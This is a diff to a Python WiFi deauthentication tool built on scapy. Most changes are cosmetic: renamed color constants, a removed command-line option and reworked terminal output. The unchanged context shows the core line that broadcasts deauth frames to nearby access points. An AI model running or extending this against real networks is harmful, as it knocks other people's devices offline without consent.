@@ -17,7 +17,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from os import system, path, getuid, uname
 from random import choice
 from scapy.all import *
-from sys import exit, stdout
+from sys import exit, stdout, stderr
 from tabulate import tabulate
 from threading import Thread
 from time import sleep, time
@@ -42,14 +42,13 @@ Deauth_Dict = {"Client":[], "APS": []}
 
 # CLASSES
 class c:
-    HEADER    = "\033[95m"
-    OKBLUE    = "\033[94m"
-    OKGREEN   = "\033[92m"
-    WARNING   = "\033[93m"
-    FAIL      = "\033[91m"
-    ENDC      = "\033[0m"
-    BOLD      = "\033[1m"
-    UNDERLINE = "\033[4m"
+    H  = "\033[95m" # Magenta
+    B  = "\033[94m" # Blue
+    W  = "\033[93m" # Yellow
+    G  = "\033[92m" # Green
+    F  = "\033[91m" # Red
+    E  = "\033[0m"  # Clear
+    Bo = "\033[1m"  # Bold
 
 
 class Configuration:
@@ -67,7 +66,7 @@ class Configuration:
         if interface in pyw.interfaces() and pyw.modeget(interface) == "monitor":
             self.interface = interface
         else:
-            print(c.FAIL + " [-] Non Monitor card selected.")
+            print(c.F + " [-] Non Monitor card selected.")
             exit(0)
         return
 
@@ -92,7 +91,7 @@ class Configuration:
             elif str(self.frequency) == "5":
                 self.hop = True
             else:
-                print(c.FAIL+" [-] Channel Setting incorrect.")
+                print(c.F+" [-] Channel Setting incorrect.")
                 exit(0)
 
             self.channel = None
@@ -103,7 +102,7 @@ class Configuration:
             elif str(self.frequency) == "5" and int(channel) in _5_channels_:
                     self.hop = False
             else:
-                print(c.FAIL+" [-] Channel Setting incorrect."+c.ENDC)
+                print(c.F+" [-] Channel Setting incorrect."+c.E)
                 exit(0)
 
             self.channel = channel
@@ -151,13 +150,6 @@ class Configuration:
             help="select a channel")
 
         parser.add_argument(
-            "-u",
-            "--unassociated",
-            action="store_true",
-            dest="unassociated",
-            help="Whether to show unassociated clients.")
-
-        parser.add_argument(
             "-a",
             "--accesspoint",
             action="store",
@@ -195,13 +187,13 @@ class Configuration:
 
     def check_root(self):
         if getuid() != 0:
-            print(c.FAIL+" [-] User is not Root.")
+            print(c.F+" [-] User is not Root.")
             exit()
         return
 
     def check_op(self):
         if uname()[0].startswith("Linux") and not "Darwin" not in uname()[0]:
-            print(c.FAIL+" [-] Wrong OS.")
+            print(c.F+" [-] Wrong OS.")
             exit()
         return
 
@@ -230,7 +222,7 @@ def handler_beacon(packet):
 
     if mac != configuration.skip:
         send(Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Deauth(), inter=(0.05), count=(configuration.packets))
-        
+
     return
 
 
@@ -361,17 +353,9 @@ def printer(configuration):
         for item in Deauth_Dict["APS"]:
             wifis.append(item)
 
-        # if len(wifis) > 20:
-        #     Deauth_Dict["APS"] = []
-        #     Access_Points = []
-
         clients = []
         for item in Deauth_Dict["Client"]:
             clients.append(item)
-
-        # if len(clients) > 12:
-        #     Deauth_Dict["Client"] = []
-        #     Clients = []
 
         wifis.sort(key=lambda x: (x[1], x[2]))
         clients.sort(key=lambda x: (x[2]))
@@ -383,13 +367,18 @@ def printer(configuration):
         else:
             printable_time = str(int(time_elapsed / 60))+" m"
 
-        system('clear')
+        stderr.write("\x1b[2J\x1b[H")
 
-        print(c.ENDC+"[+] Time: [" + printable_time + "] Striking: ["+str(configuration.channel)+"]")
-        print("")
-        print(tabulate(wifis, headers=["Mac Addr", "Ch", "SSID"], tablefmt=typetable))
-        print(c.ENDC)
-        print(tabulate(clients, headers=["Mac", "AP Mac", "Ch"], tablefmt=typetable))
+        print("{0}[+] {1}Time: {2}[{3}{4}{5}] {6}Striking: {7}[{8}{9}{10}] {11}".format(c.G, c.E, c.B, c.W, printable_time, c.B, c.E, c.B, c.W, configuration.channel, c.B, c.E))
+
+        print( "\r\n{0}{1}{2}".format(c.F+"Mac Addr".ljust(19, " "), "Ch".ljust(4, " "), "SSID"+c.E) )
+        for item in wifis:
+            print( " {0}{1:<4}{2}".format(item[0].ljust(19, " "), item[1], item[2] ))
+
+        print("\r\n{0}{1}{2}".format(c.F+"Mac".ljust(19, " "), "AP Mac".ljust(19, " "), c.E ))
+
+        for item in clients:
+            print( " {0}{1}".format(item[0].ljust(19, " "), item[1].ljust(19, " ") ))
 
         if timeout < 4:
             timeout += .05
@@ -414,7 +403,7 @@ def int_main(configuration):
         Print_Flag = False
         Channel_Hopper_Flag  = False
 
-        print(c.OKGREEN+"\r [+] "+c.ENDC+"Commit to Exit.")
+        print(c.G+"\r [+] "+c.E+"Commit to Exit.")
         exit(0)
         return 0
 
@@ -443,7 +432,7 @@ def int_main(configuration):
 
 
 def display_art():
-    print(c.OKBLUE+"""
+    print(c.B+"""
   ____                    _____ _        _ _
  |  _ \                  / ____| |      (_) |
  | |_) | ___   ___  _ __| (___ | |_ _ __ _| | _____
@@ -453,7 +442,7 @@ def display_art():
                    | |
                    |_|
     """)
-    print(c.HEADER+"     Codename: Inland Taipan\r\n"+c.BOLD)
+    print(c.H+"     Codename: Inland Taipan\r\n"+c.Bo)
     return
 
 
